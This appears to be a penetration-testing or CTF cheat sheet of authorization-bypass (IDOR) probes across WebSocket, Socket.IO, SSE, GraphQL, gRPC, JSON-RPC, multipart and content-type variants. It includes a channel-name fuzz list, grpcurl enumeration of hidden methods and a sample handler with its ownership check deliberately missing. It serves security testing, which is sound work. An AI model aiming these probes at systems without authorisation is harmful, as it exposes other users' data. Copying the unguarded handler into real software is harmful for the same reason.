# Protocol variants — the id carried by a different transport

The same object reachable over a different transport — WS, SSE,
GraphQL-sub, RPC, multipart — where the HTTP check doesn't apply.

---

## 1. The WebSocket carrier

```
wss://app/socket → {"type":"subscribe","user_id":42}
                → {"type":"get","resource":{"id":42}}
                → {"type":"msg","to":1}
                → {"op":"read","object_id":42}
                → {"action":"fetch","params":{"id":42}}
                → {"method":"get","params":{"id":42}}
                → {"event":"subscribe","channel":"user:42"}
                → {"type":"auth","token":"...","user_id":42}
                → {"type":"subscribe","channel":"user:42:notes"}
                → {"type":"subscribe","channel":"notifications:user:42"}
```

The WS message carries the id — the server-side handler may not check
ownership on the WS path (the HTTP middleware doesn't apply after the
upgrade).

## 2. The Socket.IO carrier

```
42["get_user",{"id":42}]
42["fetch",{"object_id":42}]
42["message",{"to":1,"text":"x"}]
42["subscribe","user:42"]
42["join","room:user:42"]
42["emit","read",{"id":42}]
42["call","getUser",[42]]
```

The Socket.IO event name + args carry the id.

## 3. The SSE carrier

```
GET /events?user_id=42        — the SSE stream scoped by param
GET /stream?channel=user:42
GET /subscribe?topic=user:42
GET /events?for=1
GET /events?owner=1
```

The SSE subscription's `user_id`/`channel`/`topic` is the scope.

## 4. The GraphQL subscription

```graphql
subscription { userUpdated(id:"42") { id email } }
subscription { orderCreated(userId:"1") { id } }
subscription { notificationAdded(userId:"1") { msg } }
subscription { messageReceived(userId:"1") { text } }
subscription { presenceChanged(userId:"1") { status } }
subscription { objectChanged(id:"42") { data } }
subscription { resourceUpdated(id:"42") { data } }
subscription { eventStream(filter:{userId:1}) { ... } }
```

The subscription's `id`/`userId`/`filter` is the scope.

## 5. The gRPC carrier

```
service User { rpc GetUser(GetUserReq) returns (User) }
message GetUserReq { int64 user_id = 1; }
```

The gRPC method's `user_id` field — protobuf; the check may differ from
the HTTP path. Reach via `grpcurl`/`buf` or the REST gateway.

## 6. The JSON-RPC carrier

```json
{"jsonrpc":"2.0","method":"getUser","params":{"id":42},"id":1}
{"jsonrpc":"2.0","method":"user.get","params":{"id":42},"id":1}
{"jsonrpc":"2.0","method":"UserService.Get","params":{"userId":42},"id":1}
{"jsonrpc":"2.0","method":"read","params":{"object_id":42},"id":1}
{"jsonrpc":"2.0","method":"fetch","params":[42],"id":1}
{"jsonrpc":"2.0","method":"admin.getUser","params":{"id":42},"id":1}
{"jsonrpc":"2.0","method":"admin.getFlag","params":{},"id":1}
{"jsonrpc":"2.0","method":"internal.getUser","params":{"id":42},"id":1}
{"jsonrpc":"2.0","method":"service.getUser","params":{"id":42},"id":1}
{"jsonrpc":"2.0","method":"user.list","params":{"all":true},"id":1}
{"jsonrpc":"2.0","method":"user.list","params":{"user_id":1},"id":1}
{"jsonrpc":"2.0","method":"user.get","params":{"id":1,"include":["secret"]},"id":1}
{"jsonrpc":"2.0","method":"user.get","params":{"id":1,"fields":["secret"]},"id":1}
{"jsonrpc":"2.0","method":"user.get","params":{"id":1,"expand":["role"]},"id":1}
{"jsonrpc":"2.0","method":"user.get","params":{"id":1,"populate":["role"]},"id":1}
{"jsonrpc":"2.0","method":"user.get","params":{"id":1,"select":["id","email","role"]},"id":1}
{"jsonrpc":"2.0","method":"user.get","params":{"id":1,"only":["id","email","role"]},"id":1}
```

The JSON-RPC `method`+`params` — `params.id` is the id; the method
namespace (`admin.`, `internal.`, `service.`) may reach privileged ops,
and `include`/`fields`/`expand`/`select`/`only` is the field-list.

## 7. The REST-as-RPC

```
POST /api/rpc {"method":"getUser","params":{"id":42}}
POST /rpc {"method":"getUser","params":{"id":42}}
POST /api {"method":"getUser","params":{"id":42}}
POST /rpc/getUser {"id":42}
POST /api/getUser {"id":42}
POST /api/user.get {"id":42}
POST /api/UserService/Get {"userId":42}
POST /api/v1/rpc {"method":"getUser","params":{"id":42}}
```

## 8. The multipart carrier

```
POST /api/data
Content-Disposition: form-data; name="id"
42
Content-Disposition: form-data; name="user_id"
1
Content-Disposition: form-data; name="file"; filename="doc_42.pdf"
```

The multipart form field carries the id — the same field the JSON body
would carry, parsed differently.

## 9. The content-type switch

```
POST /api/data Content-Type: application/json  {"id":42}
POST /api/data Content-Type: application/x-www-form-urlencoded  id=42
POST /api/data Content-Type: text/xml  <root><id>42</id></root>
POST /api/data Content-Type: application/xml  <root><id>42</id></root>
POST /api/data Content-Type: multipart/form-data  name=id value=42
POST /api/data Content-Type: application/msgpack  {...}
POST /api/data Content-Type: application/cbor  {...}
POST /api/data Content-Type: application/x-protobuf  {...}
POST /api/data Content-Type: text/plain  id=42
POST /api/data Content-Type: text/csv  id,42
```

The same `id` over a different `Content-Type` — the check may be on the
JSON parser's path, not the XML/form/msgpack path.

## 10. The WS channel-name corpus

```
user:1   user_1   user.1   user/1   user\1   user|1   user~1   user@1
user#1   user$1   user%1   user^1   user&1   user*1   user(1)  user[1]
user{1}  user<1>  user'1'  user"1"  user`1`  user!1   user?1   user=1
user+1   user,1   user;1   user 1   user\t1  user\n1  user\x001
user\u00011  user\u001f1  user\ufeff1  user\u200b1  user\u200c1
user\u200d1  user\u20601
tenant:7  org:1  account:1  team:1  group:1  project:1  room:1
user:1:notes  user:1:objects  user:1:messages  user:1:notifications
user:1:events  user:1:updates  user:1:activity  user:1:presence
user:1:inbox  user:1:feed  user:1:timeline  user:1:alerts
```

The separator variants — a parser that splits on `:` won't see `user_1`
as `user`+`1`, but the channel resolver may treat it as `user:1`. The
separator-confusion is the WS-scope bypass.

## 11. The "the WS handler skips the check" bug

```python
async def ws_handler(msg):
    obj = db.get(msg['id'])       # no session.user check — WS is a different path
    await ws.send(obj)
```

The HTTP middleware authenticates the *upgrade*; the messages after the
upgrade run a different code path — often unguarded per message.

## 12. The "the gRPC reflection" surface

```
grpcurl -plaintext target list
grpcurl -plaintext target describe Service
grpcurl -plaintext -d '{"user_id":1}' target Service.GetUser
```

The reflection API names the methods — `GetFlag`, `AdminGet`,
`InternalGet` — the hidden RPC.

## 13. The "the SSE event" scope

```
GET /events?user_id=42
data: {"type":"update","user_id":42,"object":{...A's data...}}
```

The SSE stream scoped to another's `user_id` — the events carry A's data.

## 14. The "the pub/sub topic" scope

`user/1` `user.1` `user:1` `user_1` `tenant/7` `org/1` `account/1` —
the topic/channel separator variants.

## 15. Falsifier

The WS/SSE/RPC handler scopes the same way — `subscribe "user:1"` returns
the authz error, not the stream. Record `refutes`.
